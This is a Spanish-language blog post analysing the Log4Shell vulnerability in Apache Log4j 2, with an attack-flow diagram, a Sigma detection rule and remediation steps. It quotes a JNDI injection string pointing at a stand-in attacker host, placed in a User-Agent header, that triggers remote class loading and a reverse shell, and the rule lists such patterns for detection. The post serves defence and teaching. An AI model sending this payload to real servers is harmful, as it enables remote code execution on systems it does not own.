---
title: "Análisis en profundidad de Log4Shell (CVE-2021-44228)"
date: "2026-10-02"
author: "CiberCelia"
author_github: "cibercelia"
category: "post"
tags: ["cve", "vulnerabilidad", "java", "jndi", "blueteam"]
summary: "Estudio técnico de una de las vulnerabilidades más críticas de la historia reciente: origen JNDI, mecanismo de inyección y contramedidas."
---

# Análisis de la vulnerabilidad Log4Shell (CVE-2021-44228)

En diciembre de 2021 se descubrió una vulnerabilidad de ejecución remota de código (RCE) en la librería de registro **Apache Log4j 2**, bautizada como **Log4Shell**. Con una puntuación CVSS de **10.0 (Crítica)**, afectó a millones de servicios empresariales en todo el mundo.

---

## ¿Por qué ocurrió?

Log4j incluía una funcionalidad de sustitución de mensajes que permitía consultar datos dinámicos mediante **JNDI (Java Naming and Directory Interface)**:

```text
${jndi:ldap://atacante.com/exploit}
```

Cuando Log4j procesaba un mensaje que contenía esta cadena (por ejemplo, en la cabecera `User-Agent` de una petición HTTP), intentaba contactar con el servidor LDAP del atacante y descargar una clase Java ejecutable.

---

## Flujo del ataque

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as 🦹 Atacante
    participant App as 🖥️ Servidor vulnerable (Log4j 2)
    participant LDAP as 💀 Servidor LDAP malicioso
    participant Web as 🌐 Servidor HTTP de payload

    Attacker->>App: 1. Envía petición HTTP con User-Agent: ${jndi:ldap://atacante.com/Exploit}
    Note over App: Log4j evalúa ${jndi:...} y ejecuta consulta JNDI
    App->>LDAP: 2. Consulta LDAP hacia servidor del atacante
    LDAP-->>App: 3. Devuelve referencia a clase remota (http://atacante.com/Exploit.class)
    App->>Web: 4. Descarga clase Java compilada maliciosa
    Web-->>App: 5. Entrega Exploit.class
    Note over App: Carga y ejecuta el código estático de la clase
    App-->>Attacker: 6. Shell reversa establecida (RCE en servidor)
```

---

## Detección y mitigación

### 1. Regla Sigma para detección en registros de servidor web o WAF

```yaml
title: Detección de patrones JNDI en cabeceras HTTP
status: production
logsource:
    category: webserver
detection:
    keywords:
        - '${jndi:ldap:'
        - '${jndi:rmi:'
        - '${jndi:dns:'
    condition: keywords
falsepositives:
    - Escaneos de seguridad autorizados
level: critical
```

### 2. Medidas de remediación inmediatas
- Actualizar Log4j a versiones `>= 2.17.1`.
- Configurar la propiedad del sistema `log4j2.formatMsgNoLookups=true` en versiones 2.10 a 2.14.1.
- Restringir el tráfico saliente desde servidores de aplicaciones hacia puertos no estándar de LDAP/RMI.
